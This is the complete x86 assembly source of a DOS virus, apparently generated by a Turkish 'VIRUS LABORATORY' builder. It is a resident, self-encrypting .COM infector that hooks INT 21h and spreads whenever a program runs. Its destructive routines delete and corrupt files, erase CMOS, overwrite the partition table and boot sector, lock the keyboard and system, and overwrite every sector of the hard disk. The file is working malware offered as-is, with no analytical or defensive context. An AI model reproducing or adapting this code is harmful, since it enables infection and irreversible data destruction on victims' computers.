;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;º      Bu virus , 'VIRUS LABORATORY' programi tarafindan hazirlanmistir.   º
;ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
;º      VIRUS LABORATORY programi Süleyman GÜNEL tarafindan 1998 tarihinde  º
;º yazilmistir. Programin amaci istenen aktiviteleri gösterebilecek bilgi-  º
;º sayar virüslerinin yazilmasi islemini otomatiklestirmektir.              º
;ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
;º                                 UYARI !!!                                º
;º      Gerek 'VIRUS LABORATORY' programinin gerekse de bu program tarafin- º
;º dan üretilmis viruslerin sebep olabilecegi hiçbir problem ve zarardan    º
;º programin yazari - Süleyman GÜNEL - sorumlu tutulamaz. Bu programlarin   º
;º kullanilmasi ile bu sart otomatik olarak kabul edilmis olmaktadir.       º
;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
;Versiyon.......: 1.50
;Yazan..........: VIRUS LABORATORY (Sleyman GšNEL (eGo))
;Tarih..........: 30/11/2001
;Saat...........: 19:53:21
;Genel..........: TSR + Bulasici (.COM) + Encrypt + Actions
;Ek bilgi.......: COMMAND.COM ve WIN.COM dosyalarna bulasmaz
;
;============================================================================
.286
cseg segment
assume cs:cseg,ds:cseg,es:cseg
org 100h
;
;=============================== ANA PROGRAM ================================
Start: jmp Sifreli
Imza:  db '‚‡Œ‘–› ¥'
Dosya: dw 0f0f0h
Sifre: dw 0b0b0h
;----------------------------------------------------------------------------
Sifreli:  cmp word ptr cs:[Sifre],0b0b0h
          jz TSRmi
          mov cx,offset Finish - Offset TSRmi
          mov di,offset TSRmi
KoduAc:   not byte ptr cs:[di]
          inc di
          loop KoduAc
;----------------------------------------------------------------------------
TSRmi:    mov ax,7f7fh
          int 21h
          cmp ax,0f7f7h
          jz Bellekte
          mov ax,3521h
          int 21h
          mov word ptr cs:[int21],bx
          mov word ptr cs:[int21+2],es
          mov ax,2521h
          mov dx,offset Virus
          int 21h
          mov dx,offset Finish
          int 27h
          mov ah,4ch
          int 21h
;----------------------------------------------------------------------------
Bellekte: mov ax,word ptr cs:[Dosya]
          cmp ax,0f0f0h
          jnz Dosyada
Yanliz:   mov ah,4ch
          int 21h
Dosyada:  mov ax,offset Finish
          add ax,word ptr cs:[OFS]
          jmp ax
;******************************* VIRUS KODU *********************************
Virus:   
DosyaSilLabel:
          cmp ah,4bh
          jnz DosyaBozLabel
          call DosyaSil
DosyaBozLabel:
          cmp ah,4bh
          jnz ZamanDegistirLabel
          call DosyaBoz
ZamanDegistirLabel:
          cmp ah,4bh
          jnz BootSilLabel
          call ZamanDegistir
BootSilLabel:
          cmp ah,4bh
          jnz BootDegistirLabel
          call BootSil
BootDegistirLabel:
          cmp ah,4bh
          jnz PartSilLabel
          call BootDegistir
PartSilLabel:
          cmp ah,4bh
          jnz CmosResetLabel
          call PartSil
CmosResetLabel:
          cmp ah,4bh
          jnz KlavyeKilitleLabel
          call CmosReset
KlavyeKilitleLabel:
          cmp ah,4bh
          jnz SistemKilitleLabel
          call KlavyeKilitle
SistemKilitleLabel:
          cmp ah,4bh
          jnz ColdResetLabel
          call SistemKilitle
ColdResetLabel:
          cmp ah,4bh
          jnz EkranaYazLabel
          call ColdReset
EkranaYazLabel:
          cmp ah,4bh
          jnz YaziciyaYazLabel
          call EkranaYaz
YaziciyaYazLabel:
          cmp ah,4bh
          jnz KlavyeLedleriLabel
          call YaziciyaYaz
KlavyeLedleriLabel:
          cmp ah,4bh
          jnz VideoModuLabel
          call KlavyeLedleri
VideoModuLabel:
          cmp ah,4bh
          jnz HarddiskYazLabel
          call VideoModu
HarddiskYazLabel:
          cmp ah,4bh
          jnz Infection
          call HarddiskYaz
Infection:cmp ah,4bh
          je Bulas
          cmp ax,7f7fh
          jnz OrgInt21
          mov ax,0f7f7h
          iret
OrgInt21: jmp dword ptr cs:[int21]
          ret
;----------------------------------------------------------------------------
Bulas:    pushf
          pusha
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
;----------------------------------------------------------------------------
          mov bx,-1
          mov cx,00ffh
DosComs:  inc bx
          push cx
          push cs
          pop es
          mov si,dx
          add si,bx
          mov di,offset DosComspec
          mov cx,0011
          cld
          rep cmpsb
          jne DosComsE
          jmp Comspec
DosComsE: pop cx
          loop DosComs
;----------------------------------------------------------------------------
          mov bx,-1
          mov cx,00ffh
WinComs:  inc bx
          push cx
          push cs
          pop es
          mov si,dx
          add si,bx
          mov di,offset WinComspec
          mov cx,0007
          cld
          rep cmpsb
          jne WinComsE
Comspec:  pop cx
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          popa
          popf
          jmp OrgInt21
WinComsE: pop cx
          loop WinComs
;----------------------------------------------------------------------------
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          popa
          popf
          pushf
          pusha
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
;----------------------------------------------------------------------------
          push cs
          pop ds
          push cs
          pop es
          mov ax,3524h
          int 21h
          mov word ptr cs:[int24],bx
          mov word ptr cs:[int24+2],es
          mov ax,2524h
          mov dx,offset Hata
          int 21h
;----------------------------------------------------------------------------
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          popa
          popf
          pushf
          pusha
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
;----------------------------------------------------------------------------
AttribAl: mov ax,4300h
          int 21h
          mov word ptr cs:[Attrib],cx
;----------------------------------------------------------------------------
          mov ax,4301h
          xor cx,cx
          int 21h
;----------------------------------------------------------------------------
DosyaAc:  mov ax,3d02h
          int 21h
          mov word ptr cs:[Handle],ax
          mov bx,ax
;----------------------------------------------------------------------------
ZamanAl:  mov ax,5700h
          int 21h
          mov word ptr cs:[FileOrgTime],cx
          mov word ptr cs:[FileOrgDate],dx
;----------------------------------------------------------------------------
BoyuAl:   push cs
          pop ds
          mov ax,4202h
          CALL Pointer
          mov word ptr cs:[OFS],ax
;----------------------------------------------------------------------------
          mov ax,4200h
          CALL Pointer
;----------------------------------------------------------------------------
VeriAl:   push cs
          pop ds
          push cs
          pop es
          mov ah,3fh
          mov cx,000fh
          mov dx,offset Veri
          int 21h
;----------------------------------------------------------------------------
          mov si,offset Veri
          mov di,offset Tip
          mov cx,2
          cld
          rep movsb
;----------------------------------------------------------------------------
          cmp word ptr cs:[Tip],05a4dh
          jne Devam1
          jmp Bulasma
;----------------------------------------------------------------------------
Devam1:   push cs
          pop ds
          push cs
          pop es
          mov si,offset Veri+3
          mov di,offset Imza
          mov cx,8
          cld
          rep cmpsb
          jne Devam2
          jmp Bulasma
;----------------------------------------------------------------------------
Devam2:   mov si,offset Veri+11
          mov di,offset File
          mov cx,2
          cld
          rep movsb
;----------------------------------------------------------------------------
kopyala:  push cs
          pop ds
          push cs
          pop es
          mov si,offset Start
          mov di,offset Finish + 100h
          mov cx,offset Finish - offset Start
          cld
          rep movsb
;----------------------------------------------------------------------------
          mov ax,4200h
          CALL Pointer
;----------------------------------------------------------------------------
          mov ah,3fh
          mov cx,cs:[OFS]
          mov dx,offset Finish + 100h + (offset Finish - offset Start)
          int 21h
;----------------------------------------------------------------------------
CopyCopy: push cs
          pop ds
          push cs
          pop es
          mov si,offset Copy
          mov di,offset Finish + 100h + (offset Finish - offset Start)
          add di,cs:[OFS]
          mov cx,offset Finish - offset Copy
          cld
          rep movsb
;----------------------------------------------------------------------------
          mov word ptr cs:[Offset Finish + 100h + (offset Dosya - Offset Start )],0f1f1h
;----------------------------------------------------------------------------
          mov cx,offset Finish - Offset TSRmi
          mov di,offset Finish + 100h + (offset TSRmi - offset Start)
Kodla:    not byte ptr cs:[di]
          inc di
          loop Kodla
          mov word ptr cs:[Offset Finish + 100h + (offset Sifre - Offset Start )],0b1b1h
;----------------------------------------------------------------------------
DosyaYaz: push cs
          pop ds
          mov ax,4200h
          CALL Pointer
;----------------------------------------------------------------------------
          mov ah,40h
          mov bx,cs:[Handle]
          mov cx,word ptr cs:[OFS]
          add cx,offset Finish - offset Start
          add cx,offset Finish - offset Copy
          mov dx,offset Finish + 100h
          int 21h
;----------------------------------------------------------------------------
Bulasma:  mov ax,5701h
          mov cx,word ptr cs:[FileOrgTime]
          mov dx,word ptr cs:[FileOrgDate]
          int 21h
;----------------------------------------------------------------------------
          mov ah,3eh
          int 21h
;----------------------------------------------------------------------------
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          popa
          popf
;----------------------------------------------------------------------------
          pusha
          mov ax,4301h
          mov cx,word ptr cs:[Attrib]
          int 21h
          popa
;----------------------------------------------------------------------------
          pushf
          pusha
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
;----------------------------------------------------------------------------
          mov ax,2524h
          mov bx,offset int24 + 2
          mov ds,bx
          mov bx,offset int24
          int 21h
;----------------------------------------------------------------------------
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          popa
          popf
;----------------------------------------------------------------------------
          jmp OrgInt21
;----------------------------------------------------------------------------
Copy:     push cs
          pop ds
          push cs
          pop es
          mov si,offset Finish
          mov di,100h
          mov cx,word ptr cs:[OFS]
          cld
          rep movsb
          mov ax,100h
          jmp ax
;----------------------------------------------------------------------------
 
;++++++++++++++++++++++++++++++ Alt Yordamlar +++++++++++++++++++++++++++++++
Pointer: xor cx,cx
         xor dx,dx
         int 21h
         ret
;----------------------------------------------------------------------------
Hata:    xor al,al
         iret
;----------------------------------------------------------------------------
HataSakla:push cs
          pop ds
          push cs
          pop es
          mov ax,3524h
          int 21h
          mov word ptr cs:[int24],bx
          mov word ptr cs:[int24+2],es
          mov ax,2524h
          mov dx,offset Hata
          int 21h
          ret
;----------------------------------------------------------------------------
HataYaz:  mov ax,2524h
          mov bx,offset int24 + 2
          mov ds,bx
          mov bx,offset int24
          int 21h
          ret
;+++++++++++++++++++++++++++++++++ Aktiviteler ++++++++++++++++++++++++++++++
Actions:
;.................................
DosyaSil:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov ax,3d02h
          int 21h
          mov bx,ax
          mov ah,3eh
          int 21h
          mov ax,4301h
          xor cx,cx
          int 21h
          mov ah,41h
          int 21h
DosyaSilExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
DosyaBoz:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov ax,3d02h
          int 21h
          mov bx,ax
          mov ah,3eh
          int 21h
          mov ax,4301h
          xor cx,cx
          int 21h
          mov ax,3d02h
          int 21h
          mov ah,40h
          mov cx,0ffffh
          xor dx,dx
          push ds
          mov ds,dx
          int 21h
          pop ds
          mov ah,3eh
          int 21h
DosyaBozExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
ZamanDegistir:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov al,07h
          out 70h,al
          in al,71h
          mov ah,al
          inc ah
          mov al,07h
          out 70h,al
          mov al,ah
          out 71h,al
          mov al,08h
          out 70h,al
          in al,71h
          mov ah,al
          inc ah
          mov al,08h
          out 70h,al
          mov al,ah
          out 71h,al
          mov al,09h
          out 70h,al
          in al,71h
          mov ah,al
          inc ah
          mov al,09h
          out 70h,al
          mov al,ah
          out 71h,al
ZamanDegistirExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
BootSil:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov cx,00ffh
CmsRst2:  mov al,cl
          out 70h,al
          xor al,al
          out 71h,al
          loop CmsRst2
          mov ax,0301h
          mov cx,0001h
          mov dx,0180h
          int 13h
BootSilExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
BootDegistir:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov cx,00ffh
CmsRst1:  mov al,cl
          out 70h,al
          xor al,al
          out 71h,al
          loop CmsRst1
          mov ax,0301h
          mov cx,0001h
          mov dx,0180h
          mov bx,offset NewBootCode
          push cs
          pop es
          int 13h
BootDegistirExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
PartSil:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov cx,00ffh
CmsRst3:  mov al,cl
          out 70h,al
          xor al,al
          out 71h,al
          loop CmsRst3
          mov ax,0301h
          mov cx,0001h
          mov dx,0080h
          int 13h
PartSilExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
CmosReset:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov cx,00ffh
CmsRst:   mov al,cl
          out 70h,al
          xor al,al
          out 71h,al
          loop CmsRst
CmosResetExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
KlavyeKilitle:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov al,0cch
          out 61h,al
KlavyeKilitleExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
SistemKilitle:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          cli
SysLck:   mov cx,0ffffh
          loop SysLck
SistemKilitleExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
ColdReset:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          jmp dword ptr cs:[ColdResetAdres]
ColdResetExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
EkranaYaz:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov ah,09h
          push cs
          pop ds
          mov dx,offset cs:[VirusMsg]
          int 21h
EkranaYazExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
YaziciyaYaz:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          push ds
          push es
          call HataSakla
          pop es
          pop ds
          mov ch,00
          mov byte ptr cl,cs:[LenVirusMsgPrint]
          push cs
          pop ds
          mov di,offset cs:[VirusMsgPrint]
          mov ah,05h
          mov dl,13
          int 21h
VrsMsg:   mov ah,05h
          mov byte ptr dl,ds:[di]
          int 21h
          inc di
          loop VrsMsg
          mov ah,05h
          mov dl,13
          int 21h
          mov ah,05h
          mov dl,12
          int 21h
          call HataYaz
YaziciyaYazExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
KlavyeLedleri:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov ah,10h
          and ah,07h
          mul ah
          mov bl,al
          mov ax,0040h
          mov ds,ax
          mov di,0017h
          and byte ptr ds:[di],143
          or byte ptr ds:[di],bl
KlavyeLedleriExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
VideoModu:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov al,00
          out 70h,al
          in al,71h
          and al,07h
          mov ah,00
          int 10h
VideoModuExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;.................................
HarddiskYaz:
          push ax
          push bx
          push cx
          push dx
          push si
          push di
          push bp
          push es
          push ds
          mov ah,08h
          mov dl,80h
          int 13h
          jnc OpCont
          jmp HarddiskYazExit
OpCont:   mov byte ptr cs:[MaxTrack1],ch
          push cx
          and cl,192
          mov byte ptr cs:[MaxTrack2],cl
          pop cx
          and cl,63
          mov byte ptr cs:[MaxSector],cl
          mov byte ptr cs:[MaxHead],dh
          xor ch,ch
          mov dh,01h
          mov cl,02h
OpStart:  push cx
          and byte ptr cl,cs:[MaxSector]
          cmp byte ptr cl,cs:[MaxSector]
          pop cx
          jz MaxS
          inc cl
          jmp OpRun
MaxS:     and cl,192
          or cl,01h
          cmp byte ptr dh,cs:[MaxHead]
          jz MaxH
          inc dh
          jmp OpRun
MaxH:     xor dh,dh
          cmp byte ptr ch,cs:[MaxTrack1]
          jz MaxT1
          inc ch
          jmp OpRun
MaxT1:    xor ch,ch
          push cx
          and byte ptr cl,cs:[MaxTrack2]
          cmp byte ptr cl,cs:[MaxTrack2]
          pop cx
          jz HarddiskYazExit
          add cl, 64
OpRun:    mov ax,0301h
          mov dl,80h
          xor bx,bx
          mov es, bx
          int 13h
          jmp OpStart
HarddiskYazExit:
          pop ds
          pop es
          pop bp
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          ret
;+++++++++++++++++++++++++++ Degiskenler & Veriler ++++++++++++++++++++++++++
OFS    dw 0000
Veri   db 00,00,'12345678',00,00,00,00,00,00
int21  dd ?
int24  dd ?
Handle dw 0000
Attrib dw 0000
Tip    dw 0000
Sign   db 0,0,0,0,0,0,0,0
File   dw 0000
Crypt  dw 0000
DosComspec db 'COMMAND.COM'
WinComspec db 'WIN.COM'
FileOrgDate dw ?
FileOrgTime dw ?
 
NewBootCode db 0EAh,00,00,0FFh,0FFh
ColdResetAdres       dd 0FFFF0000h
VirusMsg db 'deneme',13,10,'$'
VirusMsgPrint db 'salak',13,10,'$'
LenVirusMsgPrint db  5
MaxSector   db 00
MaxHead     db 00
MaxTrack1   db 00
MaxTrack2   db 00
 
Finish:
 
cseg ends
end Start

